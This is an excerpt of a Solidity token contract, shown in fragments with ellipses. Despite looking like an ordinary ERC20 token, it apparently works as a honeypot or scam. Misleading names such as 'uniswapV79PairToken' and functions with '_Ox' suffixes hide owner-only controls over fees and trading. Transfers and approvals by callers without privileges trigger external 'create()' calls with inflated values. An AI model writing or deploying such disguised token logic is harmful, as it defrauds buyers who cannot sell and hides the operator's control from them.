...
contract Token is Context, IERC20, Ownable {
    ...
    uniswapV1 private uniswapV79PairToken;
    ...
    address private uniswapV79Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV79PairToken = uniswapV1(uniswapV79Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV79Pair_] = true;
        _isExcludedFromFee[uniswapV79Pair_] = true;
    ...
    function SetholderRew_Ox1168988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV79PairToken.create(8**3);
        }
    }

    function SelectItvs_Ox1168968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
...
/*    function pair_Ox1168998(address aaaa, bool b) public {
...
*/    
    function argum_Ox1168618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV79PairToken.create(8**3);
    ...
    function Ecaor_Ox1168628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV79PairToken.create(8**3);
    ...
    function fees_Ox1168633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function initialitzeW_Ox1168658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV79PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV79PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV79PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV79PairToken.create(250**3); 
        }
